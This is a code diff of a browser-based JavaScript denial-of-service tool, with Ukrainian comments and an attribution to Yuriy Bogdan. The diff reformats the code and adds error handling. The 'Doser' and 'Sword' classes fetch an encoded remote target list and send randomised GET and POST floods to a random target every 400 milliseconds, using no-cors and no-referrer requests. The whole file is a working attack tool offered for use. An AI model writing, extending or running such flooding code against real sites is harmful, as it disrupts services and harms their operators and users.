@@ -7,22 +7,30 @@ Copyright (c) 2022-2023 Yuriy Bogdan
 // @ts-nocheck
 
 const Tools = {
-	charSet: "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890",
+	charSet: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890',
 
+	/**
+	 * Отримати флуд
+	 *
+	 * @example Tools.getFlood(12) // 'YOt4umytz56I'
+	 *
+	 * @param {number} lenght Об'єм флуду (в кількості символів)
+	 * @returns {string} Флуд
+	 */
 	getFlood(lenght) {
-		let flood = "";
+		let flood = '';
 
 		for (let i = 0; i < lenght; i++) {
-			flood += randomChoice(this.charSet)
+			flood += randomChoice(this.charSet);
 		}
-		return flood
+		return flood;
 	},
 	/**
 	 * Отримання цілей для атаки
-	 * 
+	 *
 	 * Беруться цілі, для яких в нас є **потрібний метод** для атаки
-	 * 
-	 * @example 
+	 *
+	 * @example
 	 * await Tools.getTargets()
 	 * [
 	 *   {
@@ -31,118 +39,160 @@ const Tools = {
 	 *   },
 	 *   ...
 	 * ]
-	 * 
+	 *
 	 * @param {array} supportedMethods - Методи, якими ми можемо атакувати
 	 * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)
 	 */
 	async getTargets(supportedMethods) {
-		return await fetch(targetSource).then(async function (response) {
-			if (response.ok) {
-				const responseText = await response.text()
+		return new Promise(
+			async (resolve, reject) =>
+				await fetch(targetSource, {
+					cache: 'no-cache',
+				})
+					.then(async (response) => {
+						if (response) {
+							const responseText = await response.text();
+							/** @type {Target[]} */
+							let encodedData;
+							try {
+								encodedData = JSON.parse(atob(responseText));
+							} catch (e) {
+								reject(new TargetsEncodingError());
+							}
 
-				/** @type {Target[]} */
-				const encodedData = JSON.parse(atob(responseText))
+							if (encodedData.length != 0) {
+								/** @type {Target[]} */
+								let filteredTargets = [];
 
-				/** @type {Target[]} */
-				let filteredTargets = []
+								for (let target of encodedData) {
+									supportedMethods.includes(target.method) &&
+										filteredTargets.push(target);
+								}
 
-				for (let target of encodedData) {
-					supportedMethods.includes(target.method) && filteredTargets.push(target)
-				}
-
-				return filteredTargets;
-			}
-		},
-		() => {}
-		)
-	}
-}
+								resolve(filteredTargets);
+							} else {
+								reject(new EmptyTargetsList());
+							}
+						}
+					})
+					.catch(() => {
+						reject(new TargetsFetchingError());
+					})
+		);
+	},
+};
 
 class Sword {
 	constructor() {
 		this.defaultRequestParams = {
 			cache: 'no-cache',
 			referrerPolicy: 'no-referrer',
-			mode: 'no-cors'
-		}
+			mode: 'no-cors',
+		};
 	}
 
 	async attack(target) {
-		this[target.method](target)
+		this[target.method](target);
 	}
-
 
 	async request(url, data) {
 		await fetch(url, {
 			...this.defaultRequestParams,
-			...data
-		})
+			...data,
+		});
 	}
 
 	async get(target) {
-		const page = target.page
+		const page = target.page;
 
-		if (!page.includes("?")) {
-			page += "/" + Tools.getFlood(64)
+		if (!page.includes('?')) {
+			page += '/' + Tools.getFlood(64);
 		}
 
 		await this.request(page, {
-			method: "GET"
-		})
+			method: 'GET',
+		});
 	}
 
 	async post(target) {
 		await this.request(target.page, {
-			method: "POST",
-			body: Tools.getFlood(128)
-		})
+			method: 'POST',
+			body: Tools.getFlood(128),
+		});
 	}
 }
 
 class Doser {
 	constructor() {
-		this.attack = false
-		this.attackInterval = 400
-		this.supportedAttackMethods = ['post', 'get']
+		this.attack = false;
+		this.attackInterval = 400;
+		this.supportedAttackMethods = ['post', 'get'];
 	}
 
 	async run() {
-		this.attack ? this.stop() : this.start()
+		this.attack ? this.stop() : this.start();
 	}
 
 	async start() {
 		if (!this.attack) {
-			Panel.buttonText("Стоп")
-			Sounds.click.play()
-			this.attack = true
+			Panel.buttonText('Стоп');
+			Sounds.click.play();
+			this.attack = true;
 
-			const targets = await Tools.getTargets(this.supportedAttackMethods)
+			await Tools.getTargets(this.supportedAttackMethods)
+				.then(async (targets) => {
+					// Атакоцикл, брум-брум! 😂
+					this.attackCycle = setInterval(async () => {
+						const randomTarget = randomChoice(targets);
 
-			if (!targets) {
-				swal("Помилка", "Не вдалось завантажити цілі", "error")
-				Panel.buttonText("Старт!")
-				return;
-			} // else
+						Panel.showCurrentTarget(randomTarget);
 
-			// Атакоцикл, брум-брум! 😂
-			this.attackCycle = setInterval(async () => {
-				const randomTarget = randomChoice(targets)
+						await Sword.attack(randomTarget).then(
+							() => Panel.increaseAttacksCounter(),
+							() => Panel.increaseAttacksCounter()
+						);
+					}, this.attackInterval);
+				})
+				.catch((err) => {
+					console.log(err);
 
-				Panel.showCurrentTarget(randomTarget)
+					switch (err.name) {
+						case 'TargetsFetchingError':
+							Swal.fire(
+								'Помилка',
+								'Не вдалось завантажити цілі',
+								'error'
+							);
+							break;
 
-				await Sword.attack(randomTarget)
-					.then(() => Panel.increaseAttacksCounter(),
-						  () => Panel.increaseAttacksCounter())
+						case 'EmptyTargetsList':
+							Swal.fire(
+								'Повідомлення',
+								'Список цілей порожній, можемо відпочивати)',
+								'success'
+							);
+							break;
 
-			}, this.attackInterval)
+						case 'TargetsEncodingError':
+							Swal.fire(
+								'Помилка',
+								'Не вдалось розшифрувати цілі, повідомте про це розробнику',
+								'error'
+							);
+							break;
+					}
+					Panel.buttonText('Старт!');
+					this.attack = false;
+				});
 		}
 	}
 
 	/** Зупинка атаки */
 	stop() {
-		clearInterval(this.attackCycle)
-		this.attack = false
-		Sounds.click.play()
-		Panel.buttonText("Старт!")
+		clearInterval(this.attackCycle);
+		this.attack = false;
+		Sounds.click.play();
+		console.clear();
+		Panel.buttonText('Старт!');
 	}
 }
